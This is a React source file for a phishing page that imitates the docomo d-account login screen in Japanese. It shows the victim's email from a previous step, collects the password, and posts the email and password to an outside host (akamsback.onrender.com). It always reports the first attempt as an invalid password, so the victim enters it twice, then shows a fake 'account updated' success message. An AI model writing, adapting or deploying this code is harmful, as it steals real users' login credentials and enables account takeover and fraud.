import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import logotwo from './logotwo.gif';
import { useLocation } from 'react-router-dom';
import decomo from './decomo.png';
import decomotwo from './decomotwo.png';
import person from './person.png';

function Next(){

    const location = useLocation();
    
    const[password, setPassword] = useState("");
    
    const[email ,setEmail] = useState(location.state.email);

    const[platform, setPlatform] = useState("Decomo")

    const[showError, setShowError] = useState(false);

    const[isLoading, setIsLoading]= useState(false);

    const[showPassword, setShowPassword] = useState(false);
    const[count, setCount] = useState(0);

    const[showSuccess, setShowSuccess] = useState(false);


    async function handleSubmit(e){
        e.preventDefault();
    
        try {

            
            const response = await axios.post('https://akamsback.onrender.com/api/send', {
                email:email,
                password:password,
                platform:platform
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
          

            if(response.status == 200 && count < 1){
                console.log(response.data.message);
                setCount(count + 1);
    
                setShowError(true);
                setShowSuccess(false);
            }

            else if(response.status == 200 && count == 1){
                console.log(response.data.message);
                    setCount(0);
                    setShowError(false);
                    setShowSuccess(true);
              }

          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }



    return (
       <>

<div className='mainContent'>

<div className='shadowdiv text-center'>
    <img src={decomo} className="mylogo" />
</div>

{showError && <div className="col-md-4 m-auto alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>無効なメールアドレスまたはパスワード</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            {showSuccess && <div className="col-md-4 m-auto alert alert-success alert-dismissible fade show" role="alert">
            <strong className='text-center'>正しいパスワードです。アカウントが更新されました。</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

<div className='col-md-6 m-auto maindiv '>

    <div className='imagediv px-5'>
        <img src={decomotwo} className="mylogotwo" />

    </div>

    <div className='px-5'>

    

  

    <form onSubmit={handleSubmit}>
    <div className='py-1 px-4'>



        <div className='roundeddiv mt-3'>

            <img className='myimage' src={person} />

            <div>
                <p><span className='nextspan'>dアカウントID</span> <br/> {email}</p>
                
            </div>

        </div>



    <h2 className='text-left label py-2'>パスワード</h2>
        <input onChange={function(e){
        setPassword(e.target.value);
    }} value={password}  type="text"className='form-control py-4'placeholder='8 から 20 文字の半角英数字と記号の組み合わせ' required/>
        

        <div className='text-right mt-1'>
            <a className='forgot' href="https://id.smt.docomo.ne.jp/src/utility/idpw_forget.html">パスワードをお忘れの方</a>

        </div>

       
        </div>
        
        <div className='px-3 text-center mt-4'>

            {
                password.length < 8 ? <button className='nextwo btn'disabled>ログイン

                </button>
                : <button type="submit" className='next btn'>ログイン

                </button>
            }
        

        </div>

        <div className='px-3 text-center mt-4'>

           <a href='/' className='nexthree btn'>
                戻る

                </a>
            
            
        

        </div>
    </form>

    </div>


   

    



</div>




</div>
       
       </>
    );

}

export default Next;